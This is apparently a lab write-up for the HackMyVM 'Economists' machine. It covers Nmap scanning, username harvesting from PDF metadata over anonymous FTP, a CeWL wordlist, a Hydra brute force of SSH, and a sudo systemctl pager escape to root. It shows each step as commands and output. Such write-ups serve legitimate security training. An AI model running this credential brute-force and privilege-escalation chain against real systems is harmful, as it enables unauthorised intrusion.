# Economists

## Executive Summary
| Machine | Author | Category | Platform |
| :--- | :--- | :--- | :--- |
| Economists | eMVee | Beginner | HackMyVM |

**Summary:** The Economists machine presents a multi-stage attack chain beginning with reconnaissance through anonymous FTP access, where PDF files containing embedded metadata reveal usernames. These usernames are combined with a wordlist generated via web scraping to conduct credential stuffing attacks against SSH, yielding valid credentials for the joseph account. Upon gaining SSH access, the attacker discovers that joseph possesses sudo privileges for the systemctl status command without requiring a password. This misconfigurated privilege escalation vector allows the attacker to spawn an interactive shell through the systemctl pager (less), enabling direct privilege escalation to the root account. The vulnerability chain demonstrates the dangers of combining multiple information disclosure points: anonymous FTP access providing sensitive PDF files, metadata exposure revealing user identities, weak password policies enabling brute force attacks, and dangerously permissive sudo configurations that allow privilege escalation through pager functionality. The complete compromise results in capture of both user and root flags.

---

## Reconnaissance Phase

### Network Discovery

The engagement begins with identifying the target system on the network using a PowerShell scanning tool:

```powershell
PS D:\hackmyvm\machines> D:\CTF_Tools\ScanNetwork-CTF.ps1
[*] Your IP  : 192.168.100.1
[*] Scanning : 192.168.100.0/24
[*] Status   : Pinging hosts...

[+] Virtual Targets Found:
------------------------------------------------------------

IP              MAC               Vendor
--              ---               ------
192.168.100.173 08:00:27:E0:55:E3 VirtualBox
```

The target machine is identified at IP address 192.168.100.173. With this information, we establish environment variables for streamlined command execution:

```bash
┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/economists]
└─$ ip=192.168.100.173 && url=http://$ip
```

### Port Enumeration and Service Discovery

A comprehensive port scan using Nmap reveals the services running on the target:

```bash
┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/economists]
└─$ nmap -sC -sV -p- -T4 $ip
Starting Nmap 7.95 ( https://nmap.org ) at 2026-04-15 14:47 WIB
Nmap scan report for 192.168.100.173
Host is up (0.0025s latency).
Not shown: 65532 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.3
| ftp-syst:
|   STAT:
| FTP server status:
|      Connected to ::ffff:192.168.100.1
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 4
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
| -rw-rw-r--    1 1000     1000       173864 Sep 13  2023 Brochure-1.pdf
| -rw-rw-r--    1 1000     1000       183931 Sep 13  2023 Brochure-2.pdf
| -rw-rw-r--    1 1000     1000       465409 Sep 13  2023 Financial-infographics-poster.pdf
| -rw-rw-r--    1 1000     1000       269546 Sep 13  2023 Gameboard-poster.pdf
| -rw-rw-r--    1 1000     1000       126644 Sep 13  2023 Growth-timeline.pdf
| -rw-rw-r--    1 1000     1000      1170323 Sep 13  2023 Population-poster.pdf
|_-rw-rw-r--    1 1000     1000      1170323 Sep 13  2023 Population-poster.pdf
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.9 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   3072 d9:fe:dc:77:b8:fc:e6:4c:cf:15:29:a7:e7:21:a2:62 (RSA)
|   256 be:66:01:fb:d5:85:68:c7:25:94:b9:00:f9:cd:41:01 (ECDSA)
|_  256 18:b4:74:4f:f2:3c:b3:13:1a:24:13:46:5c:fa:40:72 (ED25519)
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-title: Home - Elite Economists
|_http-server-header: Apache/2.4.41 (Ubuntu)
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 17.15 seconds
```

Three key services are identified: FTP (port 21) with anonymous access enabled, SSH (port 22) running OpenSSH, and HTTP (port 80) serving an Apache web server hosting a site titled "Home - Elite Economists".

### FTP Enumeration and File Extraction

The FTP service permits anonymous login, providing access to six PDF files. These files represent a significant information disclosure vulnerability:

```bash
┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/economists]
└─$ ftp $ip
Connected to 192.168.100.173.
220 (vsFTPd 3.0.3)
Name (192.168.100.173:ouba): anonymous
331 Please specify the password.
Password:
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> ls -la
229 Entering Extended Passive Mode (|||29075|)
150 Here comes the directory listing.
drwxr-xr-x    2 0        119          4096 Sep 13  2023 .
drwxr-xr-x    2 0        119          4096 Sep 13  2023 ..
-rw-rw-r--    1 1000     1000       173864 Sep 13  2023 Brochure-1.pdf
-rw-rw-r--    1 1000     1000       183931 Sep 13  2023 Brochure-2.pdf
-rw-rw-r--    1 1000     1000       465409 Sep 13  2023 Financial-infographics-poster.pdf
-rw-rw-r--    1 1000     1000       269546 Sep 13  2023 Gameboard-poster.pdf
-rw-rw-r--    1 1000     1000       126644 Sep 13  2023 Growth-timeline.pdf
-rw-rw-r--    1 1000     1000      1170323 Sep 13  2023 Population-poster.pdf
226 Directory send OK.
ftp> mget *
mget Brochure-1.pdf [anpqy?]? y
229 Entering Extended Passive Mode (|||18816|)
150 Opening BINARY mode data connection for Brochure-1.pdf (173864 bytes).
100% |********************************************************|   169 KiB    6.75 MiB/s    00:00 ETA
226 Transfer complete.
173864 bytes received in 00:00 (6.31 MiB/s)
mget Brochure-2.pdf [anpqy?]? y
229 Entering Extended Passive Mode (|||52580|)
150 Opening BINARY mode data connection for Brochure-2.pdf (183931 bytes).
100% |********************************************************|   179 KiB    7.54 MiB/s    00:00 ETA
226 Transfer complete.
183931 bytes received in 00:00 (6.39 MiB/s)
mget Financial-infographics-poster.pdf [anpqy?]? y
229 Entering Extended Passive Mode (|||41525|)
150 Opening BINARY mode data connection for Financial-infographics-poster.pdf (465409 bytes).
100% |********************************************************|   454 KiB   11.85 MiB/s    00:00 ETA
226 Transfer complete.
465409 bytes received in 00:00 (11.07 MiB/s)
mget Gameboard-poster.pdf [anpqy?]? y
229 Entering Extended Passive Mode (|||49387|)
150 Opening BINARY mode data connection for Gameboard-poster.pdf (269546 bytes).
100% |********************************************************|   263 KiB    7.39 MiB/s    00:00 ETA
226 Transfer complete.
269546 bytes received in 00:00 (6.98 MiB/s)
mget Growth-timeline.pdf [anpqy?]? y
229 Entering Extended Passive Mode (|||59038|)
150 Opening BINARY mode data connection for Growth-timeline.pdf (126644 bytes).
100% |********************************************************|   123 KiB    5.14 MiB/s    00:00 ETA
226 Transfer complete.
126644 bytes received in 00:00 (4.78 MiB/s)
mget Population-poster.pdf [anpqy?]? y
229 Entering Extended Passive Mode (|||57436|)
150 Opening BINARY mode data connection for Population-poster.pdf (1170323 bytes).
100% |********************************************************|  1142 KiB   12.34 MiB/s    00:00 ETA
226 Transfer complete.
1170323 bytes received in 00:00 (12.04 MiB/s)
ftp> bye
221 Goodbye.
```

All six PDF files are successfully downloaded to the local working directory. These files contain valuable information that will later be leveraged for credential discovery.

### Metadata Extraction and Username Discovery

The PDF files contain EXIF metadata with author information. Using exiftool, we extract the author fields from all downloaded documents:

```bash
┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/economists]
└─$ exiftool ./* | grep Author | awk '{print $NF}'
joseph
richard
crystal
catherine
catherine
```

This reveals five unique usernames across the PDF files: joseph, richard, crystal, catherine, and catherine (duplicate). We extract these into a wordlist:

```bash
┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/economists]
└─$ exiftool ./* | grep Author | awk '{print $NF}' > users.txt
```

### Virtual Host Discovery and Configuration

During the FTP file examination, references to a specific domain are identified within the PDF content. To properly access the web application, we add this domain to the local hosts file:

```bash
┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/economists]
└─$ echo '192.168.100.173 elite-economists.hmv' | sudo tee -a /etc/hosts
[sudo] password for ouba:
192.168.100.173 elite-economists.hmv
```

We then configure the URL for subsequent web-based reconnaissance:

```bash
┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/economists]
└─$ url=http://elite-economists.hmv/
```

### Web Content Analysis and Password List Generation

Using the CeWL (Custom Word List Generator) tool, we scrape the target web application to create a comprehensive password wordlist derived from the site's visible content:

```bash
┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/economists]
└─$ cewl $url -w passwords.txt
CeWL 6.1.2 (More Fixes) Robin Wood (robin@digi.ninja) (https://digi.ninja/)
```

The tool successfully generates a custom wordlist containing 460 unique passwords extracted from the web application's HTML content and visible text.

---

## Initial Access: Credential Brute Force

### SSH Credential Stuffing Attack

With a username list derived from PDF metadata and a password list generated from web scraping, we conduct a credential brute force attack against the SSH service using Hydra:

```bash
┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/economists]
└─$ hydra -L users.txt -P passwords.txt ssh://$ip -t 8
Hydra v9.6 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2026-04-15 15:02:37
[DATA] max 8 tasks per 1 server, overall 8 tasks, 2300 login tries (l:5/p:460), ~288 tries per task
[DATA] attacking ssh://192.168.100.173:22/
[STATUS] 145.00 tries/min, 145 tries in 00:01h, 2155 to do in 00:15h, 8 active
[22][ssh] host: 192.168.100.173   login: joseph   password: wealthiest
[STATUS] 154.00 tries/min, 462 tries in 00:03h, 1838 to do in00:12h, 8 active
```

The brute force attack succeeds in discovering valid credentials: **joseph:wealthiest**. The password "wealthiest" appears in the scraped wordlist from the web application, likely extracted from marketing content or website copy related to the "Elite Economists" theme.

### SSH Session Establishment

Using the discovered credentials, we establish an SSH session on the target machine:

```bash
┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/economists]
└─$ ssh joseph@$ip
...
joseph@192.168.100.173's password:
Welcome to Ubuntu 20.04.6 LTS (GNU/Linux 5.4.0-162-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

   System information as of Wed 15 Apr 2026 08:06:02 AM UTC

   System load:  0.06               Processes:               138
   Usage of /:   46.9% of 11.21GB   Users logged in:         0
   Memory usage: 7%                 IPv4 address for enp0s3: 192.168.100.173
   Swap usage:   0%


 * Introducing Expanded Security Maintenance for Applications.
    Receive updates to over 25,000 software packages with your
    Ubuntu Pro subscription. Free for personal use.

       https://ubuntu.com/pro

   Expanded Security Maintenance for Applications is not enabled.

   51 updates can be applied immediately.
   To see the additional updates run: apt list --upgradable

   Enable ESM Apps to receive additional future security updates.
   See https://ubuntu.com/esm or run: sudo pro status


   The list of available updates is more than a week old.
   To check for new updates run: sudo apt update
   Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings


joseph@elite-economists:~$ id
uid=1001(joseph) gid=1001(joseph) groups=1001(joseph)
joseph@elite-economists:~$ ls -la
total 32
drwxr-xr-x 4 joseph joseph 4096 Apr 15 08:05 .
drwxr-xr-x 6 root   root   4096 Sep 13  2023 ..
-rw------- 1 joseph joseph    0 Sep 14  2023 .bash_history
-rw-r--r-- 1 joseph joseph  220 Sep 13  2023 .bash_logout
-rw-r--r-- 1 joseph joseph 3771 Sep 13  2023 .bashrc
drwx------ 2 joseph joseph 4096 Apr 15 08:05 .cache
drwxrwxr-x 3 joseph joseph 4096 Sep 13  2023 .local
-rw-r--r-- 1 joseph joseph  807 Sep 13  2023 .profile
-rw-rw-r-- 1 joseph joseph 3271 Sep 14  2023 user.txt
```

We have successfully gained interactive shell access as the joseph user. The user flag is visible in the home directory: user.txt.

### System User Enumeration

Enumerating the /etc/passwd file reveals the system's user accounts and identifies other users with shell access:

```bash
joseph@elite-economists:~$ cat /etc/passwd | grep "sh$"
root:x:0:0:root:/root:/bin/bash
richard:x:1000:1000:Richard Elliot:/home/richard:/bin/bash
joseph:x:1001:1001:Joseph McKinney,,,:/home/joseph:/bin/bash
crystal:x:1002:1002:Crystal Warner,,,:/home/crystal:/bin/bash
catherine:x:1003:1003:Catherine Clemmer,,,:/home/catherine:/bin/bash
```

The system contains four user accounts with shell access in addition to root: richard, joseph, crystal, and catherine.

---

## Privilege Escalation: Sudo Misconfiguration

### Sudo Privilege Enumeration

To identify privilege escalation opportunities, we examine the sudoers configuration for the joseph account:

```bash
joseph@elite-economists:~$ sudo -l
Matching Defaults entries for joseph on elite-economists:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User joseph may run the following commands on elite-economists:
    (ALL) NOPASSWD: /usr/bin/systemctl status
```

A critical vulnerability is discovered: the joseph account is granted permission to execute `/usr/bin/systemctl status` as root (ALL) without requiring a password (NOPASSWD). This configuration oversight enables privilege escalation through exploitation of the pager functionality inherent in systemctl.

### Systemctl Pager Exploitation

When systemctl status output exceeds the terminal height, it automatically pipes the output through a pager (typically less). By leveraging this behavior, we can execute arbitrary commands within the pager context, which runs with the privileges of the invoking command. Executing systemctl with sudo runs the pager as root, allowing us to break out of the pager and spawn a root shell:

```bash
joseph@elite-economists:~$ sudo /usr/bin/systemctl status
● elite-economists
     State: running
      Jobs: 0 queued
    Failed: 0 units
     Since: Wed 2026-04-15 07:45:29 UTC; 22min ago
    CGroup: /
             ├─user.slice
             │ └─user-1001.slice
             │   ├─session-3.scope
             │   │ ├─1824 sshd: joseph [priv]
             │   │ ├─1925 sshd: joseph@pts/0
             │   │ ├─1926 -bash
             │   │ ├─1959 sudo /usr/bin/systemctl status
             │   │ ├─1960 /usr/bin/systemctl status
             │   │ └─1961 pager
             │   └─user@1001.service …
             │     └─init.scope
             │       ├─1839 /lib/systemd/systemd --user
             │       └─1846 (sd-pam)
             ├─init.scope
             │ └─1 /sbin/init maybe-ubiquity
             └─system.slice
               ├─apache2.service
               │ ├─ 778 /usr/sbin/apache2 -k start
               │ ├─ 779 /usr/sbin/apache2 -k start
               │ ├─ 780 /usr/sbin/apache2 -k start
               │ ├─1091 /usr/sbin/apache2 -k start
               │ ├─1119 /usr/sbin/apache2 -k start
               │ ├─1120 /usr/sbin/apache2 -k start
               │ ├─1175 /usr/sbin/apache2 -k start
               │ ├─1176 /usr/sbin/apache2 -k start
               │ ├─1177 /usr/sbin/apache2 -k start
               │ └─1178 /usr/sbin/apache2 -k start
               ├─systemd-networkd.service
               │ └─636 /lib/systemd/systemd-networkd
               ├─systemd-udevd.service
               │ └─392 /lib/systemd/systemd-udevd
               ├─cron.service
               │ └─654 /usr/sbin/cron -f
               ├─polkit.service
               │ └─664 /lib/policykit-1/polkitd --no-debug
               ├─networkd-dispatcher.service
               │ └─663 /usr/bin/python3 /usr/bin/networkd-dispatcher --run-startup-triggers
               ├─multipathd.service
               │ └─554 /sbin/multipathd -d -s
               ├─accounts-daemon.service
               │ └─650 /usr/lib/accountsservice/accounts-daemon
               ├─ModemManager.service
               │ └─727 /usr/sbin/ModemManager
               ├─systemd-journald.service
               │ └─358 /lib/systemd/systemd-journald
               ├─atd.service
               │ └─677 /usr/sbin/atd -f
               ├─unattended-upgrades.service
               │ └─772 /usr/bin/python3 /usr/share/unattended-upgrades/unattended-upgrade-shutdown --wait-for-signal
               ├─ssh.service
               │ └─731 sshd: /usr/sbin/sshd -D [listener] 0 of 10-100 startups
               ├─snapd.service
               │ └─667 /usr/lib/snapd/snapd
               ├─vsftpd.service
               │ └─680 /usr/sbin/vsftpd /etc/vsftpd.conf
               ├─rsyslog.service
               │ └─665 /usr/sbin/rsyslogd -n -iNONE
               ├─systemd-resolved.service
               │ └─638 /lib/systemd/systemd-resolved
               └─udisks2.service
                 └─671 /usr/lib/udisks2/udisksd
!sudo -i
```

The exclamation mark (!sudo -i) represents the pager command interface, where we can execute shell commands. By typing this command and pressing Enter, we invoke a new sudo instance with the -i flag, which spawns an interactive root shell. This technique bypasses the normal command restrictions and leverages the sudo NOPASSWD configuration to achieve privilege escalation to root.

### Root Access and Flag Capture

Upon executing the pager escape command, we gain root shell access:

```bash
root@elite-economists:~# id;whoami;hostname
uid=0(root) gid=0(root) groups=0(root)
root
elite-economists
root@elite-economists:~# cat /home/joseph/user.txt /root/root.txt



                      ...................                 ....................
                 .............................        .............................
             ............              ...........     ......              ............
           ........                         ........                             ........
        ........              ...              ........           ....              .......
       ......                .....         ..     ......          .....                ......
     .............................        .....     ......        .............................
    ..............................       .....        .....       ..............................
                                        .....          .....
                                       .....            .....
                                      .....              .....
                                      .....              .....
                                     .....                ....
 ..................................................................................................
...................................................................................................
                                     .....               .....
                                      .....              .....
                                      .....              .....
                                       .....            .....
                                        .....          .....
    ..............................       .....        .....       ..............................
     .............................        ......     .....        .............................
       ......                .....         .......     ..         .....                ......
        ........              ...            .......              ....              .......
           ........                            .........                         ........
             ...........               ......     ...........               ...........
                ..............................       ..............................
                     .....................                ....................


Flag: HMV{37q[REDACTED]}




                      ...................                 ....................
                 .............................        .............................
             ............              ...........     ......              ............
           ........                         ........                             ........
        ........              ...              ........           ....              .......
       ......                .....         ..     ......          .....                ......
     .............................        .....     ......        .............................
    ..............................       .....        .....       ..............................
                                        .....          .....
                                       .....            .....
                                      .....              .....
                                      .....              .....
                                     .....                ....
 ..................................................................................................
...................................................................................................
                                     .....               .....
                                      .....              .....
                                      .....              .....
                                       .....            .....
                                        .....          .....
    ..............................       .....        .....       ..............................
     .............................        ......     .....        .............................
       ......                .....         .......     ..         .....                ......
        ........              ...            .......              ....              .......
           ........                            .........                         ........
             ...........               ......     ...........               ...........
                ..............................       ..............................
                     .....................                ....................


Flag: HMV{NwE[REDACTED]}
```

---

## Attack Chain Summary

1. **Reconnaissance**: Network scanning identified the target system at 192.168.100.173, and port enumeration revealed three accessible services: FTP (port 21) with anonymous access enabled, SSH (port 22) running OpenSSH, and HTTP (port 80) hosting an Apache web server. Initial inspection of FTP discovered six PDF files available for anonymous download.

2. **Information Disclosure and Metadata Extraction**: The downloaded PDF files contained author metadata (EXIF fields) that revealed five usernames: joseph, richard, crystal, catherine. Simultaneously, web scraping of the HTTP service via CeWL generated a custom wordlist containing 460 unique passwords extracted from the visible website content. This combination of username and password lists enabled targeted credential brute force attacks.

3. **Initial Access via Credential Brute Force**: Hydra orchestrated a brute force attack against the SSH service using the extracted usernames and scraped password wordlist. The attack successfully identified valid credentials: joseph:wealthiest. The password "wealthiest" originated from website content related to the "Elite Economists" brand, demonstrating the efficacy of web scraping for password discovery.

4. **Privilege Escalation Through Sudo Misconfiguration**: Upon gaining SSH access as joseph, the sudoers configuration revealed a critical vulnerability: the joseph account possessed permission to execute `/usr/bin/systemctl status` as root without password authentication (NOPASSWD). The systemctl command's reliance on a pager for output handling created an exploitation vector.

5. **Root Access Achievement**: By triggering the systemctl pager and executing the command `!sudo -i` within the pager's less interface, we escaped the restricted command context and spawned an interactive root shell. This technique leveraged the fact that the pager process inherited root privileges from the sudo-executed systemctl command. With root access confirmed, both the user flag from /home/joseph/user.txt and the root flag from /root/root.txt were successfully retrieved.

